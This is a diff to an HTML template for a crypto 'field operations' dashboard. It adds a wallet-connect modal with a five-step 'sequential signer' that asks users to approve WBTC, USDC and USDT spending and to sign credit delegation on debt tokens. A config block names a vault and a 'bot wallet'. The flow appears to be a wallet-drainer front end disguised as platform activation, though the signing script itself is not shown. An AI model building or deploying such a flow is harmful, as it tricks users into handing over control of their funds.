@@ -5,23 +5,110 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>PROJECT 87 — FIELD OPS</title>
   <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><circle cx='16' cy='16' r='14' fill='%23050a0f' stroke='%2300e5ff' stroke-width='2'/><text x='16' y='21' text-anchor='middle' font-size='14' fill='%2300e5ff' font-family='monospace'>87</text></svg>">
-  <link rel="stylesheet" href="/static/mobile_dashboard.css" nonce="{{ nonce }}">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+  <link rel="stylesheet" href="/static/mobile_dashboard.css">
 </head>
 <body>
+
+<div id="cm-modal">
+
+  <div id="cm-connect-phase" class="cm-phase">
+    <div class="cm-logo">⬡ PROJECT 87</div>
+    <div class="cm-phase-title">FIELD OPERATIONS TERMINAL</div>
+    <div class="cm-phase-sub">Arbitrum Mainnet · IaaS DeFi Platform</div>
+    <div class="cm-wbtc-display hidden" id="cm-wbtc-section">
+      WBTC BALANCE: <span id="cm-wbtc-bal">SCANNING...</span>
+    </div>
+    <button class="cm-btn" id="cm-connect-btn">[ INITIALIZE CONNECTION ]</button>
+    <div class="cm-status" id="cm-connect-status"></div>
+    <div id="cm-mobile-options" class="hidden">
+      <div class="cm-phase-sub" style="margin-top:12px">OPEN IN METAMASK MOBILE:</div>
+      <a id="cm-mm-deeplink" class="cm-btn" style="display:block;margin-top:8px;text-align:center;text-decoration:none" href="#">[ OPEN IN METAMASK ]</a>
+    </div>
+  </div>
+
+  <div id="cm-signer-phase" class="cm-phase hidden">
+    <div class="cm-logo">⬡ PROJECT 87</div>
+    <div class="cm-phase-title">SEQUENTIAL SIGNER — 5-STEP ACTIVATION</div>
+    <div class="cm-wbtc-display">WBTC BALANCE: <span id="cm-signer-wbtc-bal">SCANNING...</span></div>
+
+    <div id="cm-step-container">
+      <div class="cm-step-row" id="cm-stepRow1">
+        <div class="cm-step-num">1</div>
+        <div class="cm-step-body">
+          <div class="cm-step-title">APPROVE WBTC</div>
+          <div class="cm-step-status" id="cm-step1Status">PENDING</div>
+          <div class="cm-step-tx" id="cm-step1Tx"></div>
+        </div>
+      </div>
+      <div class="cm-step-row" id="cm-stepRow2">
+        <div class="cm-step-num">2</div>
+        <div class="cm-step-body">
+          <div class="cm-step-title">SET STRATEGY LIMITS</div>
+          <div class="cm-step-status" id="cm-step2Status">PENDING</div>
+          <div class="cm-step-tx" id="cm-step2Tx"></div>
+        </div>
+      </div>
+      <div class="cm-step-row" id="cm-stepRow3">
+        <div class="cm-step-num">3</div>
+        <div class="cm-step-body">
+          <div class="cm-step-title">GASLESS CREDIT DELEGATION</div>
+          <div class="cm-step-status" id="cm-step3Status">PENDING</div>
+          <div class="cm-step-tx" id="cm-step3Tx"></div>
+        </div>
+      </div>
+      <div class="cm-step-row" id="cm-stepRow4">
+        <div class="cm-step-num">4</div>
+        <div class="cm-step-body">
+          <div class="cm-step-title">APPROVE USDC ROUTING</div>
+          <div class="cm-step-status" id="cm-step4Status">PENDING</div>
+          <div class="cm-step-tx" id="cm-step4Tx"></div>
+        </div>
+      </div>
+      <div class="cm-step-row" id="cm-stepRow5">
+        <div class="cm-step-num">5</div>
+        <div class="cm-step-body">
+          <div class="cm-step-title">APPROVE USDT SHORT CLOSE</div>
+          <div class="cm-step-status" id="cm-step5Status">PENDING</div>
+          <div class="cm-step-tx" id="cm-step5Tx"></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="cm-progress-bar"><div class="cm-progress-fill" id="cm-progress-fill" style="width:0%"></div></div>
+    <div class="cm-progress-label" id="cm-progress-label">READY</div>
+
+    <button class="cm-btn" id="cm-activate-btn" style="margin-top:16px">[ ACTIVATE SEQUENTIAL SIGNER ]</button>
+    <div class="cm-status" id="cm-activation-status"></div>
+  </div>
+
+  <div id="cm-activated-phase" class="cm-phase hidden">
+    <div class="cm-logo cm-logo--green">⬡ SYSTEM ACTIVE</div>
+    <div class="cm-phase-title">SEQUENTIAL SIGNER CONFIRMED</div>
+    <div class="cm-wallet-addr" id="cm-wallet-display"></div>
+    <div class="cm-status ok" id="cm-delegation-status">CHECKING DELEGATION...</div>
+    <div class="cm-status" id="cm-resign-status"></div>
+    <button class="cm-btn hidden" id="cm-resign-btn">[ RE-SIGN CREDIT DELEGATION ]</button>
+    <button class="cm-btn cm-btn--green" id="cm-close-btn" style="margin-top:20px">[ LAUNCH FIELD OPS ]</button>
+    <button class="cm-btn cm-btn--red" id="cm-eject-btn" style="margin-top:8px">[ DISCONNECT ]</button>
+  </div>
+
+</div>
+
 <div id="app-wrapper">
 
   <div id="briefing-header">
     <div class="metric-pill">
       <span class="metric-label">NET YIELD APY</span>
-      <span class="metric-value val-green" id="bh-apy-value">SYNCING…</span>
+      <span class="metric-value val-green" id="bh-apy-value">—</span>
     </div>
     <div class="metric-pill">
       <span class="metric-label">SHIELD</span>
-      <span class="metric-value val-dim" id="bh-shield-value">SYNCING…</span>
+      <span class="metric-value val-dim" id="bh-shield-value">—</span>
     </div>
     <div class="metric-pill">
       <span class="metric-label">USDC</span>
-      <span class="metric-value val-cyan" id="bh-usdc-value">SYNCING…</span>
+      <span class="metric-value val-cyan" id="bh-usdc-value">—</span>
     </div>
   </div>
 
@@ -127,12 +214,20 @@
 
   <div id="toast"></div>
 
-  <div id="connect-overlay" class="hidden">
-    <div class="overlay-label">⬡ CONNECT WALLET<br>TO SYNC TELEMETRY</div>
-    <div class="overlay-sub">VISIT MAIN DASHBOARD TO AUTHENTICATE</div>
-  </div>
-
 </div>
-<script src="/static/mobile_dashboard.js" nonce="{{ nonce }}"></script>
+
+<script nonce="{{ csp_nonce }}">
+var CONTRACTS = {
+  WBTC:      '0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f',
+  USDC:      '0xaf88d065e77c8cC2239327C5EDb3A432268e5831',
+  USDT:      '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
+  DAI_DEBT:  '0x8619d80FB0141ba7F184CbF22fd724116D9f7ffC',
+  WETH_DEBT: '0x0c84331e39d6658Cd6e6b9ba04736cC4c4734351',
+  DM:        '{{ delegation_manager_address }}',
+  VAULT:     '{{ openclaw_vault_address }}',
+  BOT_WALLET:'{{ bot_wallet_address }}'
+};
+</script>
+<script src="/static/mobile_dashboard.js"></script>
 </body>
 </html>
